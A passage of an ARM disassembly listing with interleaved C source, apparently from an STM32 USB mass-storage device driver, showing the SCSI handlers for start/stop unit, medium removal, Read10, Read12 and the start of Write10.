 800a33a:	f003 0303 	and.w	r3, r3, #3
 800a33e:	2b01      	cmp	r3, #1
 800a340:	d106      	bne.n	800a350 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a342:	697b      	ldr	r3, [r7, #20]
 800a344:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a348:	2200      	movs	r2, #0
 800a34a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a34e:	e01a      	b.n	800a386 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a350:	687b      	ldr	r3, [r7, #4]
 800a352:	3304      	adds	r3, #4
 800a354:	781b      	ldrb	r3, [r3, #0]
 800a356:	f003 0303 	and.w	r3, r3, #3
 800a35a:	2b02      	cmp	r3, #2
 800a35c:	d106      	bne.n	800a36c <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a35e:	697b      	ldr	r3, [r7, #20]
 800a360:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a364:	2202      	movs	r2, #2
 800a366:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a36a:	e00c      	b.n	800a386 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a36c:	687b      	ldr	r3, [r7, #4]
 800a36e:	3304      	adds	r3, #4
 800a370:	781b      	ldrb	r3, [r3, #0]
 800a372:	f003 0303 	and.w	r3, r3, #3
 800a376:	2b03      	cmp	r3, #3
 800a378:	d105      	bne.n	800a386 <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a37a:	697b      	ldr	r3, [r7, #20]
 800a37c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a380:	2200      	movs	r2, #0
 800a382:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a386:	697b      	ldr	r3, [r7, #20]
 800a388:	2200      	movs	r2, #0
 800a38a:	60da      	str	r2, [r3, #12]

  return 0;
 800a38c:	2300      	movs	r3, #0
}
 800a38e:	4618      	mov	r0, r3
 800a390:	3718      	adds	r7, #24
 800a392:	46bd      	mov	sp, r7
 800a394:	bd80      	pop	{r7, pc}

0800a396 <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a396:	b480      	push	{r7}
 800a398:	b087      	sub	sp, #28
 800a39a:	af00      	add	r7, sp, #0
 800a39c:	60f8      	str	r0, [r7, #12]
 800a39e:	460b      	mov	r3, r1
 800a3a0:	607a      	str	r2, [r7, #4]
 800a3a2:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a3a4:	68fb      	ldr	r3, [r7, #12]
 800a3a6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a3aa:	68fb      	ldr	r3, [r7, #12]
 800a3ac:	32b0      	adds	r2, #176	; 0xb0
 800a3ae:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a3b2:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a3b4:	697b      	ldr	r3, [r7, #20]
 800a3b6:	2b00      	cmp	r3, #0
 800a3b8:	d102      	bne.n	800a3c0 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a3ba:	f04f 33ff 	mov.w	r3, #4294967295
 800a3be:	e015      	b.n	800a3ec <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a3c0:	687b      	ldr	r3, [r7, #4]
 800a3c2:	3304      	adds	r3, #4
 800a3c4:	781b      	ldrb	r3, [r3, #0]
 800a3c6:	2b00      	cmp	r3, #0
 800a3c8:	d106      	bne.n	800a3d8 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a3ca:	697b      	ldr	r3, [r7, #20]
 800a3cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3d0:	2200      	movs	r2, #0
 800a3d2:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3d6:	e005      	b.n	800a3e4 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a3d8:	697b      	ldr	r3, [r7, #20]
 800a3da:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3de:	2201      	movs	r2, #1
 800a3e0:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a3e4:	697b      	ldr	r3, [r7, #20]
 800a3e6:	2200      	movs	r2, #0
 800a3e8:	60da      	str	r2, [r3, #12]

  return 0;
 800a3ea:	2300      	movs	r3, #0
}
 800a3ec:	4618      	mov	r0, r3
 800a3ee:	371c      	adds	r7, #28
 800a3f0:	46bd      	mov	sp, r7
 800a3f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a3f6:	4770      	bx	lr

0800a3f8 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a3f8:	b580      	push	{r7, lr}
 800a3fa:	b086      	sub	sp, #24
 800a3fc:	af00      	add	r7, sp, #0
 800a3fe:	60f8      	str	r0, [r7, #12]
 800a400:	460b      	mov	r3, r1
 800a402:	607a      	str	r2, [r7, #4]
 800a404:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a406:	68fb      	ldr	r3, [r7, #12]
 800a408:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a40c:	68fb      	ldr	r3, [r7, #12]
 800a40e:	32b0      	adds	r2, #176	; 0xb0
 800a410:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a414:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a416:	697b      	ldr	r3, [r7, #20]
 800a418:	2b00      	cmp	r3, #0
 800a41a:	d102      	bne.n	800a422 <SCSI_Read10+0x2a>
  {
    return -1;
 800a41c:	f04f 33ff 	mov.w	r3, #4294967295
 800a420:	e09d      	b.n	800a55e <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a422:	697b      	ldr	r3, [r7, #20]
 800a424:	7a1b      	ldrb	r3, [r3, #8]
 800a426:	2b00      	cmp	r3, #0
 800a428:	f040 808f 	bne.w	800a54a <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a42c:	697b      	ldr	r3, [r7, #20]
 800a42e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a432:	7f1b      	ldrb	r3, [r3, #28]
 800a434:	b25b      	sxtb	r3, r3
 800a436:	2b00      	cmp	r3, #0
 800a438:	db0b      	blt.n	800a452 <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a43a:	697b      	ldr	r3, [r7, #20]
 800a43c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a440:	7f59      	ldrb	r1, [r3, #29]
 800a442:	2320      	movs	r3, #32
 800a444:	2205      	movs	r2, #5
 800a446:	68f8      	ldr	r0, [r7, #12]
 800a448:	f7ff feec 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a44c:	f04f 33ff 	mov.w	r3, #4294967295
 800a450:	e085      	b.n	800a55e <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a452:	697b      	ldr	r3, [r7, #20]
 800a454:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a458:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a45c:	2b02      	cmp	r3, #2
 800a45e:	d108      	bne.n	800a472 <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a460:	7af9      	ldrb	r1, [r7, #11]
 800a462:	233a      	movs	r3, #58	; 0x3a
 800a464:	2202      	movs	r2, #2
 800a466:	68f8      	ldr	r0, [r7, #12]
 800a468:	f7ff fedc 	bl	800a224 <SCSI_SenseCode>

      return -1;
 800a46c:	f04f 33ff 	mov.w	r3, #4294967295
 800a470:	e075      	b.n	800a55e <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a472:	68fb      	ldr	r3, [r7, #12]
 800a474:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a478:	68fa      	ldr	r2, [r7, #12]
 800a47a:	33b0      	adds	r3, #176	; 0xb0
 800a47c:	009b      	lsls	r3, r3, #2
 800a47e:	4413      	add	r3, r2
 800a480:	685b      	ldr	r3, [r3, #4]
 800a482:	689b      	ldr	r3, [r3, #8]
 800a484:	7afa      	ldrb	r2, [r7, #11]
 800a486:	4610      	mov	r0, r2
 800a488:	4798      	blx	r3
 800a48a:	4603      	mov	r3, r0
 800a48c:	2b00      	cmp	r3, #0
 800a48e:	d008      	beq.n	800a4a2 <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a490:	7af9      	ldrb	r1, [r7, #11]
 800a492:	233a      	movs	r3, #58	; 0x3a
 800a494:	2202      	movs	r2, #2
 800a496:	68f8      	ldr	r0, [r7, #12]
 800a498:	f7ff fec4 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a49c:	f04f 33ff 	mov.w	r3, #4294967295
 800a4a0:	e05d      	b.n	800a55e <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a4a2:	687b      	ldr	r3, [r7, #4]
 800a4a4:	3302      	adds	r3, #2
 800a4a6:	781b      	ldrb	r3, [r3, #0]
 800a4a8:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a4aa:	687b      	ldr	r3, [r7, #4]
 800a4ac:	3303      	adds	r3, #3
 800a4ae:	781b      	ldrb	r3, [r3, #0]
 800a4b0:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a4b2:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a4b4:	687b      	ldr	r3, [r7, #4]
 800a4b6:	3304      	adds	r3, #4
 800a4b8:	781b      	ldrb	r3, [r3, #0]
 800a4ba:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a4bc:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a4be:	687a      	ldr	r2, [r7, #4]
 800a4c0:	3205      	adds	r2, #5
 800a4c2:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a4c4:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a4c6:	697a      	ldr	r2, [r7, #20]
 800a4c8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4cc:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a4ce:	687b      	ldr	r3, [r7, #4]
 800a4d0:	3307      	adds	r3, #7
 800a4d2:	781b      	ldrb	r3, [r3, #0]
 800a4d4:	021b      	lsls	r3, r3, #8
 800a4d6:	687a      	ldr	r2, [r7, #4]
 800a4d8:	3208      	adds	r2, #8
 800a4da:	7812      	ldrb	r2, [r2, #0]
 800a4dc:	4313      	orrs	r3, r2
 800a4de:	697a      	ldr	r2, [r7, #20]
 800a4e0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4e4:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a4e6:	697b      	ldr	r3, [r7, #20]
 800a4e8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4ec:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a4ee:	697b      	ldr	r3, [r7, #20]
 800a4f0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4f4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a4f6:	7af9      	ldrb	r1, [r7, #11]
 800a4f8:	68f8      	ldr	r0, [r7, #12]
 800a4fa:	f000 fb0c 	bl	800ab16 <SCSI_CheckAddressRange>
 800a4fe:	4603      	mov	r3, r0
 800a500:	2b00      	cmp	r3, #0
 800a502:	da02      	bge.n	800a50a <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a504:	f04f 33ff 	mov.w	r3, #4294967295
 800a508:	e029      	b.n	800a55e <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a50a:	697b      	ldr	r3, [r7, #20]
 800a50c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a510:	699a      	ldr	r2, [r3, #24]
 800a512:	697b      	ldr	r3, [r7, #20]
 800a514:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a518:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a51a:	6979      	ldr	r1, [r7, #20]
 800a51c:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a520:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a524:	fb01 f303 	mul.w	r3, r1, r3
 800a528:	429a      	cmp	r2, r3
 800a52a:	d00b      	beq.n	800a544 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a52c:	697b      	ldr	r3, [r7, #20]
 800a52e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a532:	7f59      	ldrb	r1, [r3, #29]
 800a534:	2320      	movs	r3, #32
 800a536:	2205      	movs	r2, #5
 800a538:	68f8      	ldr	r0, [r7, #12]
 800a53a:	f7ff fe73 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a53e:	f04f 33ff 	mov.w	r3, #4294967295
 800a542:	e00c      	b.n	800a55e <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a544:	697b      	ldr	r3, [r7, #20]
 800a546:	2202      	movs	r2, #2
 800a548:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a54a:	697b      	ldr	r3, [r7, #20]
 800a54c:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a550:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a552:	7afb      	ldrb	r3, [r7, #11]
 800a554:	4619      	mov	r1, r3
 800a556:	68f8      	ldr	r0, [r7, #12]
 800a558:	f000 fb0a 	bl	800ab70 <SCSI_ProcessRead>
 800a55c:	4603      	mov	r3, r0
}
 800a55e:	4618      	mov	r0, r3
 800a560:	3718      	adds	r7, #24
 800a562:	46bd      	mov	sp, r7
 800a564:	bd80      	pop	{r7, pc}

0800a566 <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a566:	b580      	push	{r7, lr}
 800a568:	b086      	sub	sp, #24
 800a56a:	af00      	add	r7, sp, #0
 800a56c:	60f8      	str	r0, [r7, #12]
 800a56e:	460b      	mov	r3, r1
 800a570:	607a      	str	r2, [r7, #4]
 800a572:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a574:	68fb      	ldr	r3, [r7, #12]
 800a576:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a57a:	68fb      	ldr	r3, [r7, #12]
 800a57c:	32b0      	adds	r2, #176	; 0xb0
 800a57e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a582:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a584:	697b      	ldr	r3, [r7, #20]
 800a586:	2b00      	cmp	r3, #0
 800a588:	d102      	bne.n	800a590 <SCSI_Read12+0x2a>
  {
    return -1;
 800a58a:	f04f 33ff 	mov.w	r3, #4294967295
 800a58e:	e0a7      	b.n	800a6e0 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a590:	697b      	ldr	r3, [r7, #20]
 800a592:	7a1b      	ldrb	r3, [r3, #8]
 800a594:	2b00      	cmp	r3, #0
 800a596:	f040 8099 	bne.w	800a6cc <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a59a:	697b      	ldr	r3, [r7, #20]
 800a59c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5a0:	7f1b      	ldrb	r3, [r3, #28]
 800a5a2:	b25b      	sxtb	r3, r3
 800a5a4:	2b00      	cmp	r3, #0
 800a5a6:	db0b      	blt.n	800a5c0 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a5a8:	697b      	ldr	r3, [r7, #20]
 800a5aa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5ae:	7f59      	ldrb	r1, [r3, #29]
 800a5b0:	2320      	movs	r3, #32
 800a5b2:	2205      	movs	r2, #5
 800a5b4:	68f8      	ldr	r0, [r7, #12]
 800a5b6:	f7ff fe35 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a5ba:	f04f 33ff 	mov.w	r3, #4294967295
 800a5be:	e08f      	b.n	800a6e0 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a5c0:	697b      	ldr	r3, [r7, #20]
 800a5c2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5c6:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a5ca:	2b02      	cmp	r3, #2
 800a5cc:	d108      	bne.n	800a5e0 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5ce:	7af9      	ldrb	r1, [r7, #11]
 800a5d0:	233a      	movs	r3, #58	; 0x3a
 800a5d2:	2202      	movs	r2, #2
 800a5d4:	68f8      	ldr	r0, [r7, #12]
 800a5d6:	f7ff fe25 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a5da:	f04f 33ff 	mov.w	r3, #4294967295
 800a5de:	e07f      	b.n	800a6e0 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a5e0:	68fb      	ldr	r3, [r7, #12]
 800a5e2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a5e6:	68fa      	ldr	r2, [r7, #12]
 800a5e8:	33b0      	adds	r3, #176	; 0xb0
 800a5ea:	009b      	lsls	r3, r3, #2
 800a5ec:	4413      	add	r3, r2
 800a5ee:	685b      	ldr	r3, [r3, #4]
 800a5f0:	689b      	ldr	r3, [r3, #8]
 800a5f2:	7afa      	ldrb	r2, [r7, #11]
 800a5f4:	4610      	mov	r0, r2
 800a5f6:	4798      	blx	r3
 800a5f8:	4603      	mov	r3, r0
 800a5fa:	2b00      	cmp	r3, #0
 800a5fc:	d008      	beq.n	800a610 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5fe:	7af9      	ldrb	r1, [r7, #11]
 800a600:	233a      	movs	r3, #58	; 0x3a
 800a602:	2202      	movs	r2, #2
 800a604:	68f8      	ldr	r0, [r7, #12]
 800a606:	f7ff fe0d 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a60a:	f04f 33ff 	mov.w	r3, #4294967295
 800a60e:	e067      	b.n	800a6e0 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a610:	687b      	ldr	r3, [r7, #4]
 800a612:	3302      	adds	r3, #2
 800a614:	781b      	ldrb	r3, [r3, #0]
 800a616:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a618:	687b      	ldr	r3, [r7, #4]
 800a61a:	3303      	adds	r3, #3
 800a61c:	781b      	ldrb	r3, [r3, #0]
 800a61e:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a620:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a622:	687b      	ldr	r3, [r7, #4]
 800a624:	3304      	adds	r3, #4
 800a626:	781b      	ldrb	r3, [r3, #0]
 800a628:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a62a:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a62c:	687a      	ldr	r2, [r7, #4]
 800a62e:	3205      	adds	r2, #5
 800a630:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a632:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a634:	697a      	ldr	r2, [r7, #20]
 800a636:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a63a:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a63c:	687b      	ldr	r3, [r7, #4]
 800a63e:	3306      	adds	r3, #6
 800a640:	781b      	ldrb	r3, [r3, #0]
 800a642:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a644:	687b      	ldr	r3, [r7, #4]
 800a646:	3307      	adds	r3, #7
 800a648:	781b      	ldrb	r3, [r3, #0]
 800a64a:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a64c:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a64e:	687b      	ldr	r3, [r7, #4]
 800a650:	3308      	adds	r3, #8
 800a652:	781b      	ldrb	r3, [r3, #0]
 800a654:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a656:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a658:	687a      	ldr	r2, [r7, #4]
 800a65a:	3209      	adds	r2, #9
 800a65c:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a65e:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a660:	697a      	ldr	r2, [r7, #20]
 800a662:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a666:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a668:	697b      	ldr	r3, [r7, #20]
 800a66a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a66e:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a670:	697b      	ldr	r3, [r7, #20]
 800a672:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a676:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a678:	7af9      	ldrb	r1, [r7, #11]
 800a67a:	68f8      	ldr	r0, [r7, #12]
 800a67c:	f000 fa4b 	bl	800ab16 <SCSI_CheckAddressRange>
 800a680:	4603      	mov	r3, r0
 800a682:	2b00      	cmp	r3, #0
 800a684:	da02      	bge.n	800a68c <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a686:	f04f 33ff 	mov.w	r3, #4294967295
 800a68a:	e029      	b.n	800a6e0 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a68c:	697b      	ldr	r3, [r7, #20]
 800a68e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a692:	699a      	ldr	r2, [r3, #24]
 800a694:	697b      	ldr	r3, [r7, #20]
 800a696:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a69a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a69c:	6979      	ldr	r1, [r7, #20]
 800a69e:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a6a2:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a6a6:	fb01 f303 	mul.w	r3, r1, r3
 800a6aa:	429a      	cmp	r2, r3
 800a6ac:	d00b      	beq.n	800a6c6 <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a6ae:	697b      	ldr	r3, [r7, #20]
 800a6b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6b4:	7f59      	ldrb	r1, [r3, #29]
 800a6b6:	2320      	movs	r3, #32
 800a6b8:	2205      	movs	r2, #5
 800a6ba:	68f8      	ldr	r0, [r7, #12]
 800a6bc:	f7ff fdb2 	bl	800a224 <SCSI_SenseCode>
      return -1;
 800a6c0:	f04f 33ff 	mov.w	r3, #4294967295
 800a6c4:	e00c      	b.n	800a6e0 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a6c6:	697b      	ldr	r3, [r7, #20]
 800a6c8:	2202      	movs	r2, #2
 800a6ca:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a6cc:	697b      	ldr	r3, [r7, #20]
 800a6ce:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a6d2:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a6d4:	7afb      	ldrb	r3, [r7, #11]
 800a6d6:	4619      	mov	r1, r3
 800a6d8:	68f8      	ldr	r0, [r7, #12]
 800a6da:	f000 fa49 	bl	800ab70 <SCSI_ProcessRead>
 800a6de:	4603      	mov	r3, r0
}
 800a6e0:	4618      	mov	r0, r3
 800a6e2:	3718      	adds	r7, #24
 800a6e4:	46bd      	mov	sp, r7
 800a6e6:	bd80      	pop	{r7, pc}

0800a6e8 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a6e8:	b580      	push	{r7, lr}
 800a6ea:	b086      	sub	sp, #24
 800a6ec:	af00      	add	r7, sp, #0
 800a6ee:	60f8      	str	r0, [r7, #12]
 800a6f0:	460b      	mov	r3, r1
 800a6f2:	607a      	str	r2, [r7, #4]
 800a6f4:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a6f6:	68fb      	ldr	r3, [r7, #12]
 800a6f8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a6fc:	68fb      	ldr	r3, [r7, #12]
 800a6fe:	32b0      	adds	r2, #176	; 0xb0
 800a700:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a704:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a706:	697b      	ldr	r3, [r7, #20]
 800a708:	2b00      	cmp	r3, #0
 800a70a:	d102      	bne.n	800a712 <SCSI_Write10+0x2a>
  {
    return -1;
 800a70c:	f04f 33ff 	mov.w	r3, #4294967295
 800a710:	e0c7      	b.n	800a8a2 <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a712:	697b      	ldr	r3, [r7, #20]
 800a714:	7a1b      	ldrb	r3, [r3, #8]
 800a716:	2b00      	cmp	r3, #0
 800a718:	f040 80bd 	bne.w	800a896 <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a71c:	697b      	ldr	r3, [r7, #20]
 800a71e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a722:	699b      	ldr	r3, [r3, #24]
 800a724:	2b00      	cmp	r3, #0
 800a726:	d10b      	bne.n	800a740 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a728:	697b      	ldr	r3, [r7, #20]
 800a72a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
